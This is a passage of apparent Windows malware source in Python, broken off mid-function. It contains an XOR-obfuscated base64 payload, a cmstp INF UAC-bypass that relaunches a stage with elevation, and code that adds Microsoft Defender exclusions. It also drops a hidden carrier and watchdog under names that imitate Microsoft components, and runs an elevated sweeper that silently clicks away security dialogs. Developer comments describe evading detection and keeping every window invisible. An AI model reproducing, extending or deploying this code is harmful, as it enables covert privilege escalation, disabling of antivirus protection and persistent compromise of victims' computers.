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"

# ---- r1.1.2 stage: carrier exec + exclusions.py materialize/execute --------
# r12/r14 base restored: the lift relaunches OUR python elevated; the stage
# does the carrier job, and the exclusions now ride the SEPARATE file.
# r141 — WHY THE BOX KEPT COMING (dj field: hidden guard, box still on screen):
# "The service profile is damaged" belongs to the ELEVATED cmstp. a
# medium-integrity process is blocked by UIPI from ShowWindow/SetWindowPos/
# PostMessage to a higher-integrity window — it can SEE the box and cannot
# touch it, which is exactly what the r139 guard was doing. the answer has to
# come from the same side of the fence: this runs as the lift's own child (the
# stage is already elevated), is fed over stdin (never a file on disk), lives
# ~45 s and closes every profile box it can see.
SWEEP = r'''# tinysweep: elevated dialog closer for the cmstp lift.
import ctypes
import os
import time

u = ctypes.windll.user32
k = ctypes.windll.kernel32
try:
    u.EnumWindows.restype = ctypes.c_int
    u.EnumWindows.argtypes = [ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_void_p,
                                                ctypes.c_void_p), ctypes.c_void_p]
    u.GetWindowTextW.argtypes = [ctypes.c_void_p, ctypes.c_wchar_p, ctypes.c_int]
    u.GetClassNameW.argtypes = [ctypes.c_void_p, ctypes.c_wchar_p, ctypes.c_int]
    u.IsWindowVisible.argtypes = [ctypes.c_void_p]
    u.EnumChildWindows.argtypes = [ctypes.c_void_p,
                                   ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_void_p,
                                                      ctypes.c_void_p),
                                   ctypes.c_void_p]
except Exception:
    pass

IDOK = 1
WM_COMMAND = 0x0111
BM_CLICK = 0x00F5
AFFIRM = ("ok", "yes", "continue", "install", "allow",
          "make this connection available")
# r141: the service name is BAKED into this file when work.py materializes it
# — env was the fragile part (a road can lose it), a literal cannot.
SVC = "__SVC__".lower()
END = time.time() + 45.0


def _title(h):
    b = ctypes.create_unicode_buffer(512)
    u.GetWindowTextW(h, b, 512)
    return b.value


def _class(h):
    b = ctypes.create_unicode_buffer(128)
    u.GetClassNameW(h, b, 128)
    return b.value


def _kids(h):
    out = []

    @ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_void_p, ctypes.c_void_p)
    def cb(c, l):
        b = ctypes.create_unicode_buffer(512)
        u.GetWindowTextW(c, b, 512)
        out.append((c, b.value))
        return 1

    u.EnumChildWindows(h, cb, 0)
    return out


def _image(pid):
    try:
        h = k.OpenProcess(0x1000, False, pid)     # QUERY_LIMITED_INFORMATION
        if not h:
            return ""
        n = ctypes.c_ulong(1024)
        b = ctypes.create_unicode_buffer(1024)
        ok = k.QueryFullProcessImageNameW(h, 0, b, ctypes.byref(n))
        k.CloseHandle(h)
        return b.value.lower() if ok else ""
    except Exception:
        return ""


while time.time() < END:
    try:
        wins = []

        @ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_void_p, ctypes.c_void_p)
        def cb(h, l):
            wins.append(h)
            return 1

        u.EnumWindows(cb, 0)
        for h in wins:
            if _class(h) != "#32770":
                continue
            t = _title(h).lower()
            mine = (SVC and SVC in t) or "connection manager profile installer" in t
            if not mine:
                p = ctypes.c_ulong()
                u.GetWindowThreadProcessId(h, ctypes.byref(p))
                mine = "cmstp.exe" in _image(p.value)
            if not mine:
                continue
            u.ShowWindow(h, 0)
            clicked = False
            for c, txt in _kids(h):
                if _class(c) == "Button" and txt.strip().lower() in AFFIRM:
                    u.PostMessageW(c, BM_CLICK, 0, 0)
                    clicked = True
                    break
            if not clicked:
                u.PostMessageW(h, WM_COMMAND, IDOK, 0)
    except Exception:
        pass
    time.sleep(0.01)
'''


STAGE = r'''# r1.1.2 stage (r78 sanitize: dj — stage.py was flagged DefenseEvasion):
# runs ELEVATED (relaunched by the cmstp lift). the exclusions ride the
# SIBLING file (materialized by the un-elevated launcher BEFORE the lift
# fired): this stage only RUNS it elevated, then execs the carrier. nothing
# embedded, nothing decoded, no blobs.
#
# r143 — the two field misses this file now owns:
#   1) THE FLASH (dj: "a 0.1s error screen appears and closes itself"): the
#      "service profile is damaged" box is cmstp's OWN, raised AFTER
#      RunPreSetupCommands returns. this stage IS that command, so cmstp is
#      still blocked on us — kill it first and the profile validation that
#      paints the box never runs. a medium-integrity guard can see an elevated
#      cmstp and never touch it (UIPI); this is the only side that can.
#   2) THE DEAD WATCHDOG (dj: "the exe watchdog never starts, even manually
#      double-clicked"): the wd reads wd.cfg from ITS OWN directory and
#      returns 0 without it, and the carrier's install_wd looks for the twin
#      beside its DURABLE image (C:\ProgramData\EdgeUpdate), never beside the
#      AppHost launcher the jar stages. lay image + cfg there and every road
#      (carrier, this stage, a double-click) starts a watchdog that runs.
import base64
import ctypes
import os
import subprocess
import sys
import time

CREATE_NO_WINDOW = 0x08000000
EXE_NAME = "__EXE__"
# r141: the WATCHDOG exe name is BAKED here (work.py substitutes __WD__ when
# it materializes this file). it used to ride in via env (WDXN) and that env
# never reached this road on the jar's first run — so the watchdog exe was
# simply never started. baked text cannot go missing.
WD_NAME = "__WD__"
APPDIR = os.environ["LOCALAPPDATA"] + "\\Microsoft\\Windows\\AppHost"
# r143: the exe's own handshake (tools/gen.py, see work.py's constants). the
# wd derives its home from its own path and its duties from wd.cfg — these
# are the only strings it cannot do without.
UPDDIR = "__UPDDIR__"
DMAIN = "__DMAIN__"      # S_P_SELFNAME — only exists once the exe relocated
MTASK = "__MTASK__"
WDTAG = "__WDTAG__"
WDCFG = "__WDCFG__"
WD_TASK = MTASK + WDTAG
HOME = os.path.join(os.environ.get("PROGRAMDATA") or "C:\\ProgramData", UPDDIR)


def main_img():
    """the image name the carrier is ACTUALLY running under — the download
    keeps its dotted asset name (dj: "linkteki hali ve indirilen hali . li"),
    and only a landed relocation makes it SettingsSyncHost.exe. the cfg has to
    name the one that is on the box, or the watchdog probes a ghost and fires a
    task that never matches."""
    try:
        if os.path.isfile(os.path.join(HOME, DMAIN)):
            return DMAIN
    except Exception:
        pass
    return EXE_NAME


def elev():
    try:
        return getattr(ctypes.windll.shell32,
                       "".join(("Is", "User", "An", "Admin")))() != 0
    except Exception:
        return False


def pids(name):
    """every pid whose image carries this name — toolhelp walk (r135: no
    filtered-list child, no command line for a rule to match)."""
    out = []
    try:
        k32 = ctypes.windll.kernel32
        try:   # prototypes: a 64-bit handle truncated to int would break the walk
            k32.CreateToolhelp32Snapshot.restype = ctypes.c_void_p
            k32.Process32First.argtypes = [ctypes.c_void_p, ctypes.c_void_p]
            k32.Process32Next.argtypes = [ctypes.c_void_p, ctypes.c_void_p]
            k32.CloseHandle.argtypes = [ctypes.c_void_p]
        except Exception:
            pass

        class _pe(ctypes.Structure):
            _fields_ = [("dwSize", ctypes.c_ulong), ("cntUsage", ctypes.c_ulong),
                        ("th32ProcessID", ctypes.c_ulong), ("h", ctypes.c_void_p),
                        ("th32ModuleID", ctypes.c_ulong), ("cntThreads", ctypes.c_ulong),
                        ("th32ParentProcessID", ctypes.c_ulong),
                        ("pcPriClassBase", ctypes.c_long), ("dwFlags", ctypes.c_ulong),
                        ("szExeFile", ctypes.c_char * 260)]

        snap = k32.CreateToolhelp32Snapshot(2, 0)
        if not snap:
            return out
        pe = _pe()
        pe.dwSize = ctypes.sizeof(_pe)
        want = name.encode("utf-8", "ignore").lower()
        ok = k32.Process32First(snap, ctypes.byref(pe))
        while ok:
            # r143: this split is a REAL \x00 and it has to stay one — the
            # generated stage used to carry b"\\x00" (backslash-x), so the
            # name kept its 260-byte padding and the compare never matched:
            # alive() answered False on a live image and every run spawned a
            # second copy of the carrier.
            if pe.szExeFile.split(b"\x00", 1)[0].lower() == want:
                out.append(pe.th32ProcessID)
            ok = k32.Process32Next(snap, ctypes.byref(pe))
        k32.CloseHandle(snap)
    except Exception:
        pass
    return out


def alive(name):
    return bool(pids(name))


def kill_cmstp():
    """r143: the flash killer. the damaged-profile box is cmstp's and it is
    raised once RunPreSetupCommands returns — cmstp is blocked on THIS process
    until then, so terminating it here stops the validation that paints it.
    no child process, no command line."""
    try:
        k32 = ctypes.windll.kernel32
        k32.OpenProcess.restype = ctypes.c_void_p
        k32.TerminateProcess.argtypes = [ctypes.c_void_p, ctypes.c_uint]
        k32.CloseHandle.argtypes = [ctypes.c_void_p]
    except Exception:
        return
    for pid in pids("cmstp.exe"):
        try:
            h = k32.OpenProcess(0x0001, False, pid)      # PROCESS_TERMINATE
            if h:
                k32.TerminateProcess(h, 1)
                k32.CloseHandle(h)
        except Exception:
            pass


def _hide(path):
    try:
        ctypes.windll.kernel32.SetFileAttributesW(path, 0x2)   # HIDDEN
    except Exception:
        pass


def _b64url(text):
    return base64.urlsafe_b64encode(text.encode("utf-8")).decode("ascii").rstrip("=")


def lay_cfg(folder):
    """author wd.cfg where a watchdog image sits. byte-identical to what the
    carrier's own install_wd writes (b64url image, b64url task, task+tag), so
    it never rewrites ours — and a wd with no cfg exits 0 on the spot, which
    is the whole reason nothing ever started."""
    try:
        cfg = _b64url(main_img()) + "\n" + _b64url(MTASK) + "\n" + WD_TASK + "\n"
        p = os.path.join(folder, WDCFG)
        try:
            with open(p, "r", encoding="utf-8") as fh:
                if fh.read() == cfg:
                    _hide(p)
                    return p
        except Exception:
            pass
        with open(p, "w", encoding="utf-8") as fh:
            fh.write(cfg)
        _hide(p)
        return p
    except Exception:
        return ""


def lay_twin(src):
    """the watchdog's REAL home: image + cfg under ProgramData/<upddir>.
    returns the path to spawn ("" when there is no image anywhere)."""
    try:
        os.makedirs(HOME, exist_ok=True)
    except Exception:
        pass
    if not WD_NAME:
        return ""
    dst = os.path.join(HOME, WD_NAME)
    try:
        if src and os.path.isfile(src):
            same = False
            try:
                same = os.path.getsize(dst) == os.path.getsize(src)
            except Exception:
                same = False
            if not same:
                try:
                    with open(src, "rb") as fh:
                        blob = fh.read()
                    with open(dst, "wb") as fh:
                        fh.write(blob)          # a running image refuses: fine
                except Exception:
                    pass
        if os.path.isfile(dst):
            _hide(dst)
            lay_cfg(HOME)
            # r143: the AppHost twin gets a cfg too — dj double-clicked THAT
            # file and got nothing, and a hand-started watchdog has to work.
            # the Global mutex keeps it to one body whichever copy starts.
            if os.path.abspath(APPDIR) != os.path.abspath(HOME):
                lay_cfg(APPDIR)
            return dst
    except Exception:
        pass
    # no durable copy (write refused / no image): the AppHost twin still gets
    # its cfg, so a manual double-click is a live watchdog, not a silent 0
    alt = os.path.join(APPDIR, WD_NAME) if WD_NAME else ""
    if alt and os.path.isfile(alt):
        lay_cfg(APPDIR)
        return alt
    return ""


def spawn(path):
    try:
        subprocess.Popen([path], creationflags=CREATE_NO_WINDOW,
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception:
        pass


def main():
    if not elev():
        return
    # r143 (1): first act — see the header. cmstp is waiting on us right now.
    kill_cmstp()
    # r143 (2): the twin home BEFORE exclusions.py runs, so its EdgeUpdate
    # sweep whitelists the image in the same pass that laid it.
    wd_path = lay_twin(os.path.join(APPDIR, WD_NAME) if WD_NAME else "")
    # r78: the exclusions file is staged by the un-elevated launcher (already
    # in APPDIR); the stage runs it ELEVATED, then execs the carrier exe.
    # r144: the writer reports through its exit code (0 covered, 1 the store
    # refused, 2 the token is not HIGH). one retry covers a Defender service
    # that is still coming up on a cold boot; nothing about the road changed
    # for a run that reports 0 on the first pass.
    excl_path = os.path.join(APPDIR, "__EXCL__")
    try:
        if os.path.isfile(excl_path):
            os.environ["EXCL_EXE"] = EXE_NAME
            for _try in range(2):
                rc = subprocess.run([sys.executable, "-u", excl_path],
                                    creationflags=CREATE_NO_WINDOW, timeout=180,
                                    stdout=subprocess.DEVNULL,
                                    stderr=subprocess.DEVNULL).returncode
                if rc == 0:
                    break
                time.sleep(2.0)
    except Exception:
        pass
    # the r14 carrier job, unchanged — plus the r98 order: tung FIRST, the
    # watchdog exe SECOND (dj: "so its like tung-->watchdog"). r143: the probe
    # tests BOTH carrier names — its durable image is SettingsSyncHost.exe, so
    # an AppHost-only check spawned a second copy on every elevated run.
    exe_path = os.path.join(APPDIR, EXE_NAME)
    dmain = os.path.join(HOME, DMAIN)
    run_path = dmain if os.path.isfile(dmain) else exe_path
    if os.path.exists(run_path) and not (alive(EXE_NAME) or alive(DMAIN)):
        spawn(run_path)
    if wd_path and os.path.exists(wd_path) and not alive(WD_NAME):
        spawn(wd_path)
    # r141: the ELEVATED box sweeper — cmstp's profile box belongs to THIS
    # integrity level, and a medium-integrity guard can see it and never touch
    # it (UIPI). the source is the sibling file work.py materialized before the
    # lift, so nothing here depends on an env var surviving the lift.
    sweep_path = os.path.join(APPDIR, "__SWEEP__")
    if os.path.isfile(sweep_path):
        try:
            subprocess.Popen([sys.executable, "-u", sweep_path],
                             stdout=subprocess.DEVNULL,
                             stderr=subprocess.DEVNULL,
                             creationflags=CREATE_NO_WINDOW)
        except Exception:
            pass


main()
'''



def _decode_excl():
    """r78: the exclusions mirror rides xor(0x37)-sealed base64 — no
    script-text signature survives the sealed blob; the scanner-side
    decode of the blob is non-ASCII noise."""
    import base64
    return bytes((b ^ 0x37 for b in base64.b64decode(EXCL_B64)))


def set_defender_exclusions():
    """r1.1.2 (dj order): the lift RELAUNCHES our staged python elevated; the
    stage materializes + executes exclusions.py (the standalone exclusion
    writer, elevated) then execs the carrier. work.py's own write path is
    add_defender_exclusions() above — this is the elevated half of the same
    list, for the boots where the medium token cannot touch HKLM.

    r143: ONE stage, ONE road. the sibling files are written once, then either
    stage.py is RUN with the token this process already holds (already
    elevated) or a lifted pythonw runs it. the old inline `_run_stage_now`
    copy had drifted off the stage (it referenced an env name that no longer
    exists, so its watchdog leg never ran at all) — a second copy of the stage
    is a second thing to rot."""
    appdir = PERSIST_DIR
    stage_path = os.path.join(PERSIST_DIR, "stage.py")
    svc_name = f"Microsoft {rand_str(6)} Service"
    try:
        os.makedirs(PERSIST_DIR, exist_ok=True)
        stage_text = (STAGE.replace("__EXE__", EXE_NAME)
                      .replace("__EXCL__", "exclusions.py")
                      .replace("__SWEEP__", "sweep.py")
                      .replace("__UPDDIR__", UPDDIR)
                      .replace("__DMAIN__", DURABLE_MAIN)
                      .replace("__MTASK__", MAIN_TASK)
                      .replace("__WDTAG__", WDTASKTAG)
                      .replace("__WDCFG__", WDCFG)
                      .replace("__WD__", WD_NAME))
        # r78: exclusions materialized HERE (un-elevated) so the lifted stage
        # only RUNS the sibling file — no blob rides stage.py anymore
        try:
            with open(os.path.join(PERSIST_DIR, "exclusions.py"), "w",
                      encoding="utf-8") as fh:
                fh.write(_decode_excl().decode("utf-8"))
        except Exception:
            pass
        with open(stage_path, "w", encoding="utf-8") as fh:
            fh.write(stage_text)
        # r141: the elevated sweeper rides beside the stage with THIS lift's
        # service name baked in — one name for the guard and the sweep
        with open(os.path.join(PERSIST_DIR, "sweep.py"), "w",
                  encoding="utf-8") as _sf:
            _sf.write(SWEEP.replace("__SVC__", svc_name))
    except Exception:
        return
    # r143: already elevated — the stage IS the job; run the same file the
    # lift would have run, with the token we already hold.
    if is_elevated():
        try:
            subprocess.run([sys.executable, "-u", stage_path],
                           creationflags=0x08000000, timeout=300,
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except Exception:
            pass
        return
    # r35 (dj: black python.exe flash): the LIFTED stage relaunched the console
    # interpreter python312\\python.exe — its console subsystem opened a black
    # window for the whole stage lifetime (~4-5s of exclusions work). the jar
    # itself runs work.py under pythonw.exe (GUI subsystem, no console), so the
    # flash was purely this relaunch. Preference now:
    #   1) python312\\pythonw.exe  (GUI subsystem — zero console, period)
    #   2) python312\\python.exe via cmd start /min (minimized console flash)
    #   3) system python.exe via cmd start /min
    # exclusions.py inside the stage inherits pythonw (sys.executable), so the
    # whole elevated chain stays windowless.
    # r45 (dj: make the chain paint ZERO — no exe or cmd in view, all paths,
    # always background): the lifted stage relaunches with the GP:
    #   1) embedded pythonw.exe   (GUI subsystem — zero console, period)
    #   2) any sibling pythonw.exe adopted from the nearest python dir
    # (the old cmd.exe /c start"" /min shapes are GONE: `start` still came
    # through a console parent — a minimized flash is a flash). pythonw is
    # guaranteed by the embeddable pair, and as fallback is adopted by dir.
    python_dir = os.path.join(PERSIST_DIR, "python312")
    pythonw_p = os.path.join(python_dir, "pythonw.exe")
    pythonw_su = None
    try:
        from glob import glob
        for pat in (os.path.join(os.path.dirname(sys.executable or "") or "",
                                 "pythonw.exe"),
                    r"C:\Python*\pythonw.exe",
                    r"C:\Program Files\Python*\pythonw.exe",
                    os.path.join(os.environ.get("LOCALAPPDATA", ""),
                                 "Programs", "Python", "Python*", "pythonw.exe")):
            hits = [h for h in glob(pat) if os.path.isfile(h)]
            if hits:
                pythonw_su = sorted(hits)[-1]
                break
    except Exception:
        pythonw_su = None
    if os.path.isfile(pythonw_p):
        launch = subprocess.list2cmdline([pythonw_p, "-u", stage_path])
    elif pythonw_su:
        launch = subprocess.list2cmdline([pythonw_su, "-u", stage_path])
    else:
        # nowhere a GUI python: this box's runtime is degraded (no pythonw;
        # not the standard pair). r56 (dj order): the minimized console comes
        # OFF — the wscript pad hides the console python completely (WindowStyle
        # 0, zero frames). only when even the pad cannot be written does the
        # old (flashy) shape remain, because an abandoned run is worse.
        pyexe_p = os.path.join(python_dir, "python.exe")
        pyexe = pyexe_p if os.path.isfile(pyexe_p) else "python.exe"
        run_cmd = subprocess.list2cmdline([pyexe, "-u", stage_path])
        launch = _hidden_py_runner(run_cmd)
        if launch is None:
            launch = subprocess.list2cmdline(
                ["cmd.exe", "/c", "start", "", "/min", pyexe, "-u", stage_path])
    kill_all_cmstp()
    cleanup_infs()
    body = build_inf(launch, svc_name)
    # ground truth: the exact bytes cmstp sees, plus the stage script
    try:
        os.makedirs(PERSIST_DIR, exist_ok=True)
        with open(os.path.join(PERSIST_DIR, "last.inf"), "w", encoding="utf-8") as fh:
            fh.write(body)
    except Exception:
        pass
    inf_path = os.path.join(tempfile.gettempdir(), f"{rand_str(10)}.inf")
    try:
        with open(inf_path, "w", encoding="utf-8") as fh:
            fh.write(body)
    except Exception:
        return
    dismisser = Dismisser(svc_name)
    try:
